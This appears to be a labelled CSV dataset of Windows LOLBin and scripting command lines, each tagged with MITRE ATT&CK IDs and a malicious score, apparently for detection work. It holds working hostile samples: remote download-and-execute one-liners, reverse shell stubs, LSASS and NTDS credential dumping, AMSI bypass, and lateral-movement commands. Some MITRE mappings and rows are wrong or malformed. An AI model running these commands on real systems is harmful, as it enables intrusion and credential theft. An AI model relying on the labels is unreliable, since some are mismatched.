Prompt,Description,LOLBin,Content,Frequency,Source,Network,Behavioural,History,MITRE ID,MITRE Technique,Score,Type
"wmic.exe process call create ""c:\ads\file.txt:program.exe""",Executes hidden payload from alternate data stream,Yes,Executable,Rare,Script,No,ADS Payload Execution,Seen in stealthy toolkits,T1564.004,Hidden Files and ADS,0.9,Malicious
wmic.exe process call create calc,Executes calc using WMI Process class,Yes,Executable,Common,Script,No,LOLBin Execution,Used in scripting chains,T1047,WMI,0.7,Malicious
wscript c:\ads\file.txt:script.vbs,Executes VBScript from alternate data stream using wscript,Yes,Scripts,Rare,Script,No,ADS Script Execution,Classic stealth technique,T1564.004,Hidden Files and ADS,0.9,Malicious
wsreset.exe,"Resets Windows Store, can be abused for unsigned execution",Yes,System,Rare,Local,No,LOLBin Abuse,Seen in misconfig-based abuse,T1218,Signed Binary Proxy Execution,0.8,Malicious
wuauclt.exe /UpdateDeploymentProvider /RunHandlerComServer,Executes DLL via Windows Update Client,Yes,DLL,Rare,Script,No,DLL Hijacking,Known red team method,T1218.007,LOLBins,0.9,Malicious
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},"Executes control wizard, abused for launching payloads",Yes,Executable,Rare,Local,No,Execution via Wizard Loader,Observed in APT playbooks,T1218,Signed Binary Proxy Execution,0.8,Malicious
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM,Executes remote payload using Wizard binary,Yes,Web,Rare,Remote,Yes,Wizard Payload Loader,Used in web-based staging,T1105,Ingress Tool Transfer,1,Malicious
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://10.10.10.10/raw/iLxUT5gM,"Same as above, IP-based",Yes,Web,Rare,Remote,Yes,Payload Delivery,Seen in penetration tests,T1105,Ingress Tool Transfer,1,Malicious
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://11.11.11.11/raw/iLxUT5gM,Uses XWizard to load script via external IP,Yes,Web,Rare,Remote,Yes,Web-Based Wizard Abuse,Documented in post-exploitation,T1105,Ingress Tool Transfer,1,Malicious
rundll32.exe advpack.dll,Executes DLL with rundll32 using Advpack — often misused,Yes,DLL,Rare,Local,No,DLL Execution,Observed in LOLBin attacks,T1218.011,Rundll32,0.8,Malicious
"rundll32 C:\windows\system32\comsvcs.dll MiniDump ""[LSASS_PID] dump.bin full""",Uses rundll32 to dump LSASS memory,Yes,Memory,Rare,Script,No,Credential Access,Used in password extraction,T1003.001,LSASS Memory,0.9,Malicious
rundll32.exe ieadvpack.dll,Uses Internet Explorer DLL to run code via rundll32,Yes,DLL,Rare,Local,No,Execution via DLL Function,Known in evasion,T1218.011,Rundll32,0.8,Malicious
rundll32.exe Mshtml.dll,Executes function from HTML rendering DLL — abused in Squiblytwo,Yes,DLL,Rare,Local,No,Script Engine Execution,Used in MSHTML abuse,T1218.010,Regsvr32,0.8,Malicious
rundll32.exe setupapi.dll,Loads setup API DLL to potentially install drivers or registry mods,Yes,DLL,Rare,Local,No,Configuration Hijack,Used in persistence,T1218,Signed Binary Proxy Execution,0.8,Malicious
rundll32.exe shell32.dll,Executes functions from shell DLL,Yes,System,Rare,Local,No,Shell Execution,Common in abuse chains,T1218.011,Rundll32,0.8,Malicious
rundll32.exe syssetup.dll,Executes DLL setup routine via rundll32,Yes,DLL,Rare,Local,No,Installation Trick,Used in setup payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe zipfldr.dll,Loads DLL from Zip Folder DLL component — potential sideload,Yes,DLL,Rare,Local,No,DLL Misuse,Seen in toolkits,T1574.002,DLL Side-Loading,0.8,Malicious
adplus.exe -hang -pn lsass.exe -o c:\users\output -quiet,Attaches debugger to LSASS to create memory dump,No,Memory,Rare,Local,No,Credential Dump,Dangerous memory operation,T1003.001,LSASS Memory,0.75,Malicious
"AgentExecutor.exe -powershell ""c:\temp\malicious.ps1"" ...",Executes PowerShell with arguments via agent launcher,No,Script,Rare,Script,No,Script Execution Abuse,Used in lateral automation,T1059.001,PowerShell,0.85,Malicious
AppVLP.exe \webdav\calc.bat,Launches remote script via AppVLP binary from WebDAV,Yes,Scripts,Rare,Remote,Yes,Remote Script Execution,Used in red team payloads,T1216,Signed Binary Proxy Execution,1,Malicious
AppVLP.exe \10.10.10.10\calc.bat,Same method via IP-based path,Yes,Scripts,Rare,Remote,Yes,App Execution Abuse,Observed in LOLBin abuse,T1216,Signed Binary Proxy Execution,1,Malicious
bginfo.exe bginfo.bgi /popup /nolicprompt,"Launches BGInfo config silently, can be used for DLL load",Yes,DLL,Rare,Local,No,DLL Hijacking,Seen in DLL proxy attacks,T1574.001,DLL Search Order Hijacking,0.8,Malicious
cdb.exe -cf x64_calc.wds -o notepad.exe,Uses CDB debugger to launch notepad via command file,Yes,Executable,Rare,Script,No,Debugger Execution,Known in offensive simulations,T1055,Process Injection,0.9,Malicious
coregon.exe.exe /L C:\folder\evil.dll dummy_assembly_name,Loads malicious DLL via .NET utility,No,DLL,Rare,Script,No,DLL Injection,Observed in red team scripting,T1574.002,DLL Side-Loading,0.85,Malicious
coregen.exe /L C:\folder\evil.dll dummy_assembly_name,Same technique using Coregen tool,No,DLL,Rare,Script,No,Uncommon Binary Abuse,Seen in lateral payload loaders,T1218,Signed Binary Proxy Execution,0.85,Malicious
csi.exe file,Runs C# inline code via C# Interactive Shell,Yes,Scripts,Rare,Script,No,.NET Script Execution,Used in custom payload runners,T1059.005,Visual Basic,0.9,Malicious
"DefaultPack.EXE /C:""process.exe args""",Executes arbitrary process using default packager,No,Executable,Rare,Script,No,Proxy Execution,Abused in app packing,T1202,Indirect Command Execution,0.85,Malicious
"devtoolslauncher.exe LaunchForDeploy [PATH] ""args"" test",Launches development tool with potential payload,No,Executable,Rare,Script,No,Execution via Launcher,Used in embedded tools,T1218,Signed Binary Proxy Execution,0.85,Malicious
dnx.exe consoleapp,Runs .NET Core app — may hide malicious behavior,No,Executable,Rare,Script,No,Framework Loader,Seen in misused .NET packages,T1036,Masquerading,0.85,Malicious
dotnet.exe [PATH_TO_DLL],Executes DLL through .NET runtime loader,Yes,DLL,Rare,Script,No,DLL Proxy Execution,Documented in threat emulations,T1218.012,DotNet,0.9,Malicious
Dxcap.exe -c C:\Windows\System32\notepad.exe,Uses DirectX capture tool to launch payload,No,Executable,Rare,Local,No,Signed Binary Execution,Used in sandbox bypass tests,T1218,Signed Binary Proxy Execution,0.75,Malicious
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll,Opens Excel loading a remote add-in DLL,Yes,DLL,Rare,Remote,Yes,DLL Over Office,Abused in weaponized Office docs,T1137.006,Office Application Startup,1,Malicious
Mftrace.exe cmd.exe,Uses media foundation trace tool to launch cmd,No,Executable,Rare,Local,No,Binary Misuse,Abused in evasive payloads,T1218,Signed Binary Proxy Execution,0.75,Malicious
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\temp\calc.bat""",Deploys and executes command using MSDeploy,No,Executable,Rare,Script,No,Command Execution,Known in deployment abuse,T1059.003,Windows Command Shell,0.85,Malicious
msxsl.exe customers.xml script.xsl,Runs malicious XSLT script using MSXSL utility,Yes,Scripts,Rare,Script,No,Script Processor Abuse,Used in code execution chains,T1220,XSL Script Processing,0.9,Malicious
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:"" q q",Creates shadow copy of ntds.dit — potential credential theft,No,Registry,Rare,Script,No,Credential Dumping,Seen in domain attacks,T1003.003,NTDS,0.85,Malicious
"Powerpnt.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",Loads PowerPoint with remote DLL for plugin hijack,Yes,DLL,Rare,Remote,Yes,Office DLL Load,Used in phishing + add-ins,T1137.006,Office Add-ins,1,Malicious
rcsi.exe bypass.csx,Executes malicious code via C# interactive script,No,Scripts,Rare,Script,No,.NET Execution,Used in toolkits for runtime eval,T1059.005,Visual Basic,0.85,Malicious
"Remote.exe /s ""powershell.exe"" anythinghere",Launches remote process using Remote.exe,No,Executable,Rare,Script,No,Execution Proxy,Abused for sandbox evasion,T1218,Signed Binary Proxy Execution,0.85,Malicious
sqldumper.exe 464 0 0x0110,Dumps process memory — can target LSASS or protected procs,Yes,Memory,Rare,Local,No,Credential Dump,Used in advanced red team flows,T1003.001,LSASS Memory,0.8,Malicious
Sqlps.exe -noprofile,Launches SQL PowerShell — often used for persistence,Yes,Scripts,Rare,Script,No,SQL Payload Execution,Used in SQL Server attacks,T1059.001,PowerShell,0.9,Malicious
SQLToolsPS.exe -noprofile -command Start-Process calc.exe,Launches process from SQL tool PowerShell CLI,Yes,Executable,Rare,Script,No,LOLBin Execution,Observed in lateral techniques,T1059.001,PowerShell,0.9,Malicious
squirrel.exe --download [http://10.10.10.1],Downloads update/payload from remote server,No,Files,Rare,Remote,Yes,Silent Downloader,Used in trojanized apps,T1105,Ingress Tool Transfer,0.95,Malicious
squirrel.exe --update [http://10.10.10.1],Applies downloaded payload as fake update,No,Files,Rare,Remote,Yes,Update Hijack,Documented in APT abuse,T1071.001,Application Layer Protocol,0.95,Malicious
te.exe bypass.wsc,Executes script via Windows Script Component (.wsc),No,Script,Rare,Script,No,Script Component Execution,Seen in legacy script abuse,T1059,Command and Scripting Interpreter,0.85,Malicious
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe,Loads DLL via tracker config tool,No,DLL,Rare,Local,No,DLL Load,Rare misuse in bypass chains,T1574.002,DLL Side-Loading,0.75,Malicious
Update.exe --download [http://10.10.10.1],Performs fake update from malicious server,No,Files,Rare,Remote,Yes,Downloader Abuse,Mimics legitimate updaters,T1105,Ingress Tool Transfer,0.95,Malicious
Update.exe --update=[http://10.10.10.1],Executes downloaded payload disguised as update,No,Files,Rare,Remote,Yes,Trojanized Updater,Confirmed in APT reports,T1204.002,Malicious File,0.95,Malicious
Vsjitdebugger.exe calc.exe,Launches debugger attached to calc.exe — could be misused for execution,Yes,Executable,Rare,Local,No,Debugger Abuse,Used in offensive debugging,T1055,Process Injection,0.8,Malicious
"winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",Opens Word document with remote malicious add-in DLL,Yes,DLL,Rare,Remote,Yes,Office Plugin Hijack,Abused in phishing kits,T1137.006,Office Application Startup,1,Malicious
wsl.exe -e /mnt/c/Windows/System32/calc.exe,Executes Windows binary from WSL context,Yes,Executable,Rare,Local,No,WSL Abuse,Seen in cross-platform bypass,T1059.004,Unix Shell,0.8,Malicious
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',Uses WSL to initiate reverse shell,Yes,Network,Rare,Remote,Yes,Reverse Shell,Seen in stealth backdoors,T1059.004,Unix Shell,1,Malicious
. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1 runAfterCancelProcess calc.ps1,Uses PowerShell to invoke diagnostic script,No,Script,Rare,Script,No,Script Execution,Seen in evasive techniques,T1059.001,PowerShell,0.85,Malicious
set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf,Hijacks COMSPEC and uses cscript to execute payload,No,Executable,Rare,Script,No,Environment Variable Abuse,Seen in red team scenarios,T1202,Indirect Command Execution,0.85,Malicious
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,Executes script via pubprn.vbs and remote URL,Yes,Scripts,Rare,Remote,Yes,VBS Script Execution,Squiblytwo variant,T1216.001,Signed Binary Proxy Execution,1,Malicious
reg.exe import c:\path\to\Slmgr.reg & cscript.exe /b c:\windows\system32\slmgr.vbs,Imports registry and runs script for activation spoofing,Yes,Registry,Rare,Script,No,Registry and Script Abuse,Abused in malware,T1112,Modify Registry,0.9,Malicious
"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985",Uses WinRM to remotely create a process,No,Executable,Rare,Remote,Yes,Remote Process Creation,Seen in lateral movement,T1021.006,Windows Remote Management,0.95,Malicious
"Pester.bat ""$null; notepad""",Abuses batch test framework to spawn notepad,No,Executable,Rare,Script,No,Test Framework Misuse,Seen in dev environments,T1059.003,Windows Command Shell,0.85,Malicious
"C:\Python27\python.exe -c ""(lambda __y: ... )()""",Executes inline Python — potentially malicious code,No,Script,Rare,Script,No,Inline Code Execution,Documented in malware dropper,T1059.006,Python,0.85,Malicious
"ruby -rsocket -e 'c=TCPSocket.new(""10.0.0.1""...'",Opens socket in Ruby for reverse shell,No,Network,Rare,Remote,Yes,Reverse Shell via Ruby,Seen in post-exploitation,T1059.008,Network Protocols,0.95,Malicious
lua5.1 -e 'local host=...',Uses Lua interpreter to open connection or execute shell,No,Network,Rare,Remote,Yes,Scripting Abuse,Used in C2 frameworks,T1059.009,Command and Scripting Interpreter,0.95,Malicious
powershell IEX(IWR https://raw.githubusercontent.com/...Invoke-ConPtyShell.ps1),Downloads and executes reverse shell using Invoke-ConPtyShell,No,Script,Rare,Remote,Yes,PowerShell Shell Loader,Documented in payloads,T1059.001,PowerShell,0.95,Malicious
psexec \test.domain -u Domain\User -p Password ipconfig,Uses PsExec to run command on remote domain host,Yes,Executable,Rare,Remote,Yes,Lateral Execution,Classic remote admin tool,T1021.002,SMB/Windows Admin Shares,1,Malicious
"sc \10.10.10.10 create ExampleService binpath= ""c:\windows\system32\calc.exe""",Creates a service on a remote machine to execute calc,Yes,Executable,Rare,Remote,Yes,Remote Service Creation,Documented in lateral techniques,T1021.002,SMB/Windows Admin Shares,1,Malicious
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exe""",Remotely starts a process using WMI,Yes,Executable,Rare,Remote,Yes,Remote Execution,Abused in lateral attacks,T1047,WMI,1,Malicious
winrs -r:10.10.10.10 -u:DOMAIN\user -p:password calc.exe,Uses Windows Remote Shell to run payload,Yes,Executable,Rare,Remote,Yes,Lateral Movement,Part of admin toolset abuse,T1021.006,Windows Remote Management,1,Malicious
schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System,Schedules task to execute on remote machine,Yes,Executable,Rare,Remote,Yes,Task Scheduler Abuse,Known in persistence setups,T1053.005,Scheduled Task,1,Malicious
schtasks /run /tn ExampleTask /S 10.10.10.10,Runs scheduled task remotely using schtasks,Yes,Executable,Rare,Remote,Yes,Remote Task Execution,Documented in post-exploit,T1053.005,Scheduled Task,1,Malicious
schtasks /F /delete /tn ExampleTask /S host.domain,Deletes task remotely — could erase evidence,Yes,Registry,Rare,Remote,Yes,Anti-Forensics,Seen in cleanup scripts,T1070.004,File Deletion,1,Malicious
MSBuild.exe \10.10.10.10\path\to\XMLfile.xml,Executes remote MSBuild project via UNC path,Yes,Script,Rare,Remote,Yes,Remote MSBuild Abuse,Known stealth technique,T1127.001,MSBuild,1,Malicious
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""))",Instantiates COM object for MMC — could be abused,No,Script,Rare,Script,No,COM Execution via PowerShell,Used in COM hijacking,T1059.001,PowerShell,0.85,Malicious
copy C:\Windows\Temp\Malice.exe \10.10.10.10\C$\Windows\Temp,Copies malware payload to remote host,No,Files,Rare,Remote,Yes,Lateral Movement,Seen in staging routines,T1570,Lateral Tool Transfer,0.95,Malicious
mshta.exe http://malicious.domain/runme.hta,Executes remote HTA payload,Yes,Scripts,Rare,Remote,Yes,LOLBin Script Load,Common phishing tactic,T1218.005,Mshta,1,Malicious
"rundll32.exe javascript:""..\mshtml""",Executes JavaScript via rundll32 and MSHTML,Yes,Script,Rare,Local,No,LOLBin JS Abuse,Known as Squiblytwo,T1218.010,Regsvr32,0.8,Malicious
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll,Executes remote COM script via regsvr32,Yes,Script,Rare,Remote,Yes,Squiblydoo,Common LOLBin attack,T1218.010,Regsvr32,1,Malicious
powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed'),Disables AMSI to evade AV detection,No,Script,Rare,Local,No,Anti-Analysis,Documented in evasive malware,T1562.001,Disable or Modify Tools,0.75,Malicious
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.ps1'),Loads PowerView from remote source,No,Script,Rare,Remote,Yes,Reconnaissance Tool,Used in domain recon,T1087,Account Discovery,0.95,Malicious
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET'...),Uses COM object to issue HTTP request — stealth download method,No,Script,Rare,Remote,Yes,Obfuscated Downloader,Used in evasive loaders,T1059.001,PowerShell,0.95,Malicious
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""...)",Downloads PowerUp.ps1 script — often used in privilege escalation,No,Script,Rare,Remote,Yes,PowerShell Download,Common in recon,T1059.001,PowerShell,0.95,Malicious
"powershell Invoke-WebRequest ""http://10.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData...\Rev.exe""",Downloads reverse shell to startup folder,No,Executable,Rare,Remote,Yes,Reverse Shell Setup,Confirmed red team use,T1059.001,PowerShell,0.95,Malicious
powershell $bytes = [System.Text.Encoding]::Unicode.GetBytes($command),Encodes command in memory — used for obfuscation,No,Script,Rare,Script,No,Obfuscated Execution,Seen in staged payloads,T1027,Obfuscated Files,0.85,Malicious
powershell $encodedCommand = [Convert]::ToBase64String($bytes),Converts payload to Base64 — staging for -enc,No,Script,Rare,Script,No,Payload Encoding,Frequently abused in scripts,T1027,Obfuscated Files,0.85,Malicious
powershell Get-DomainUser,select -ExpandProperty cn,Queries domain user objects — reconnaissance,No,Script,Common,Local,No,User Enumeration,Used in domain mapping,T1087.002,0.45,Suspicious
powershell IEX(New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.ps1'),Loads PowerView from alternate server,No,Script,Rare,Remote,Yes,Recon Scripting,Red team standard tool,T1087.002,Domain Account,0.95,Malicious
sc \host.domain start ExampleService,Starts previously created remote service,Yes,Executable,Rare,Remote,Yes,Lateral Execution,Part of post-exploit chain,T1021.002,Admin Shares,1,Malicious
schtasks /F /delete /tn ExampleTask /S 10.10.10.10,Deletes remote task — anti-forensics or cleanup,Yes,Registry,Rare,Remote,Yes,Artifact Removal,Seen in advanced persistence,T1070.004,File Deletion,1,Malicious
psexec \10.10.10.10 -u Domain\User -p Password ipconfig,Executes command remotely via PsExec,Yes,Executable,Common,Remote,Yes,Lateral Movement,Classic toolset abuse,T1021.002,SMB/Windows Admin Shares,0.8,Malicious
"powershell [Delegate]::CreateDelegate((""Func``3[String...",Constructs and invokes PowerShell functions dynamically,No,Script,Rare,Script,No,Reflective Execution,Seen in in-memory loaders,T1027.005,Non-standard Encoding,0.85,Malicious
rundll32.exe zipfldr.dll,Executes function from zip folder DLL — rarely used,Yes,DLL,Rare,Local,No,DLL Proxy Execution,Abused in evasion scenarios,T1574.002,DLL Side-Loading,0.8,Malicious
rundll32.exe url.dll,Loads and executes from URL-handling DLL,Yes,DLL,Rare,Local,No,System DLL Execution,Used in legacy payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe setupapi.dll,Executes functions from setup DLL,Yes,DLL,Rare,Local,No,System Configuration DLL,Seen in proxy payload execution,T1218,Signed Binary Proxy Execution,0.8,Malicious
rundll32.exe shell32.dll,Commonly misused to launch various system functions,Yes,DLL,Rare,Local,No,System Execution Abuse,Observed in LOLBins,T1218.011,Rundll32,0.8,Malicious
regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll,Executes remote COM script via regsvr32 — Squiblydoo,Yes,Script,Rare,Remote,Yes,Remote Execution via COM,Documented in MITRE,T1218.010,Regsvr32,1,Malicious
pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct,Launches remote script via pubprn.vbs,Yes,Script,Rare,Remote,Yes,Script Proxy Execution,Squiblytwo class abuse,T1216.001,Signed Binary Proxy Execution,1,Malicious
"SyncAppvPublishingServer.vbs ""n;(New-Object Net.WebClient)...",Runs script embedded inside AppV server logic,Yes,Script,Rare,Remote,Yes,Scripting Abuse,Used in payload droppers,T1059.001,PowerShell,1,Malicious
rundll32.exe ieframe.dll,Executes functions from Internet Explorer frame DLL,Yes,DLL,Rare,Local,No,GUI Component Abuse,Seen in misused IE APIs,T1218,Signed Binary Proxy Execution,0.8,Malicious
rundll32.exe Mshtml.dll,Executes script engine via mshtml,Yes,Script,Rare,Local,No,MSHTML Execution,Classic Squiblytwo vector,T1218.010,Regsvr32,0.8,Malicious
regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll,Same COM remote script method using IP,Yes,Script,Rare,Remote,Yes,COM Script Execution,Well-known red team tactic,T1218.010,Regsvr32,1,Malicious
"wmic /node:target.domain process call create ""C:\Windows\Temp\Malice.exe""",Executes binary remotely using WMI,Yes,Executable,Rare,Remote,Yes,Remote Execution,Used in stealth deployments,T1047,WMI,1,Malicious
psexec \host.domain -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \host.domain\C$\Windows\Temp\build.xml,Executes MSBuild via PsExec from remote host,Yes,Executable,Rare,Remote,Yes,Compound LOLBin Abuse,Seen in post-exploit,T1127.001,MSBuild,1,Malicious
powershell [System.Management.Automation.AmsiUtils]::AmsiInitFailed,Disables AMSI — Anti-malware Scan Interface,No,Script,Rare,Script,No,Evasion,Critical for PowerShell attacks,T1562.001,Defense Evasion,0.85,Malicious
"powershell (New-Object Net.WebClient).DownloadString(""http://193.168.119.155/PowerUp.ps1"")",Loads privilege escalation script from remote server,No,Script,Rare,Remote,Yes,Remote Script Loader,Used in internal recon,T1059.001,PowerShell,0.95,Malicious
mshta.exe http://10.10.10.10/runme.hta,Loads HTA payload using mshta from IP,Yes,Script,Rare,Remote,Yes,LOLBin Execution,Used in phishing payloads,T1218.005,Mshta,1,Malicious
"rundll32.exe javascript:""..\mshtml""",Executes JavaScript through rundll32 and MSHTML,Yes,Script,Rare,Local,No,Script Engine Execution,Known as Squiblytwo,T1218.010,Regsvr32,0.8,Malicious
powershell IEX (New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.obs.ps1'),Loads PowerView (obfuscated) from remote server,No,Script,Rare,Remote,Yes,Domain Recon,Common tool abuse,T1087.002,Domain Account,0.95,Malicious
regini.exe newfile.txt:hidden.ini,Updates registry config using INI file,No,Registry,Rare,Script,No,Registry Tampering,Known in misconfig attacks,T1112,Modify Registry,0.85,Malicious
"Register-cimprovider -path ""C:\folder\evil.dll""",Registers custom CIM provider for persistence,No,DLL,Rare,Script,No,WMI Abuse,Known technique for stealth persistence,T1546.003,Event Subscription,0.85,Malicious
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Executes .NET DLL using InstallUtil with silent flag,Yes,DLL,Rare,Script,No,DLL Proxy Execution,Seen in red team chains,T1218.004,InstallUtil,0.9,Malicious
jsc.exe scriptfile.js,Compiles JavaScript into executable format,Yes,Scripts,Rare,Script,No,Code Compilation,Seen in obfuscated payload loaders,T1027.004,Compile After Delivery,0.9,Malicious
dotnet.exe [PATH_TO_DLL],Runs compiled DLL via dotnet CLI,Yes,DLL,Rare,Script,No,Framework Execution,Documented in .NET toolkits,T1218.012,DotNet Execution,0.9,Malicious
MSBuild.exe \host.domain\path\to\XMLfile.xml,Executes malicious MSBuild project via UNC path,Yes,Script,Rare,Remote,Yes,LOLBin Abuse,Seen in C2 frameworks,T1127.001,MSBuild,1,Malicious
rundll32.exe setupapi.dll,Executes function from setup API DLL,Yes,DLL,Rare,Local,No,DLL Proxy Execution,Confirmed LOLBin use,T1218.011,Rundll32,0.8,Malicious
rundll32.exe url.dll,Loads URL handler DLL — may be abused for redirection,Yes,DLL,Rare,Local,No,URL-based DLL Execution,Used in evasive payloads,T1218.011,Rundll32,0.8,Malicious
rundll32.exe zipfldr.dll,Executes from Zip folder DLL component,Yes,DLL,Rare,Local,No,System Component Execution,Rare LOLBin usage,T1218.011,Rundll32,0.8,Malicious
pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct,Loads script via pubprn using IP-based source,Yes,Script,Rare,Remote,Yes,LOLBin Script Execution,Known Squiblytwo variant,T1216.001,Signed Binary Proxy Execution,1,Malicious
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,Same technique using FQDN,Yes,Script,Rare,Remote,Yes,Scripting Proxy,Observed in phishing chains,T1216.001,Signed Binary Proxy Execution,1,Malicious
copy C:\Users\Administrator\Downloads\build.xml \10.10.10.10\C$\Windows\Temp,Transfers malicious MSBuild project to remote system,No,Files,Rare,Remote,Yes,Lateral Tool Staging,Common in red team ops,T1570,Lateral Tool Transfer,0.95,Malicious
powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://some.url/script.ps1'),In-memory execution of external PowerShell script,No,Script,Rare,Remote,Yes,Script Loader,Used in fileless malware,T1059.001,PowerShell,0.95,Malicious
cscript.exe //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4,Uses VBS to query process via WinRM,Yes,Script,Rare,Local,No,Scripting and Recon,Seen in lateral movement,T1047,WMI,0.8,Malicious
sc \10.10.10.10 start ExampleService,Starts malicious service remotely,Yes,Executable,Rare,Remote,Yes,Remote Service Abuse,Classic lateral execution,T1021.002,Admin Shares,1,Malicious
"Mshta.exe ""C:\ads\file.txt:file.hta""",Executes HTA embedded in alternate data stream,Yes,Script,Rare,Local,No,ADS Execution,Seen in stealth dropper chains,T1564.004,Hidden Files and ADS,0.8,Malicious
rasautou -d powershell.dll -p powershell -a a -e e,Launches PowerShell DLL via Remote Access Auto Connection,No,DLL,Rare,Script,No,UAC Bypass Vector,Used in bypass frameworks,T1547.001,Registry Modification,0.85,Malicious
rundll32.exe AllTheThingsx64,Executes exported function in custom DLL,Yes,DLL,Rare,Script,No,DLL Execution,Confirmed execution method,T1218.011,Rundll32,0.9,Malicious
regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,Dumps registry into alternate data stream,Yes,Registry,Rare,Script,No,Data Obfuscation,Used in persistence staging,T1564.004,Hidden Files and ADS,0.9,Malicious
extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe,Extracts executable via extrac32 — abuse for duplication,Yes,Files,Rare,Script,No,Binary Proxy Execution,Observed in evasive toolchains,T1218,Signed Binary Proxy Execution,0.9,Malicious
extrac32 /Y /C \webdavserver\share\test.txt C:\folder\test.txt,Pulls file from WebDAV — possible staging,Yes,Files,Rare,Remote,Yes,Remote File Transfer,Known in staging payloads,T1105,Ingress Tool Transfer,1,Malicious
ilasm.exe C:\public\test.txt /exe,Compiles IL assembly to EXE,Yes,Executable,Rare,Script,No,Payload Compilation,Seen in obfuscated loaders,T1027.004,Compile After Delivery,0.9,Malicious
ie4uinit.exe -BaseSettings,IE configuration tool — misused in UAC bypass,Yes,Registry,Rare,Local,No,LOLBin Initialization Abuse,Abused for elevation,T1548.002,Bypass UAC,0.8,Malicious
ieexec.exe http://11.11.11.11:8080/bypass.exe,Executes external EXE via IE execution host,Yes,Executable,Rare,Remote,Yes,Remote Execution,Seen in phishing attacks,T1218.005,Mshta,1,Malicious
explorer.exe /root,"Launches Explorer shell view (low threat, possibly suspicious)",Yes,System,Common,Local,No,GUI Execution,Minimal threat but logged,T1005,Data from Local System,0.6,Malicious
esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o,Copies VBScript via database utility,Yes,Files,Rare,Script,No,Alternate Copy Method,Observed in red team kits,T1564.004,Hidden Files and ADS,0.9,Malicious
cmstp.exe /ni /s https://raw.githubusercontent.com/.../Cmstp.inf,Uses connection manager to execute remote INF,Yes,Scripts,Rare,Remote,Yes,LOLBin Execution,Abused in phishing & C2,T1218.003,CMSTP,1,Malicious
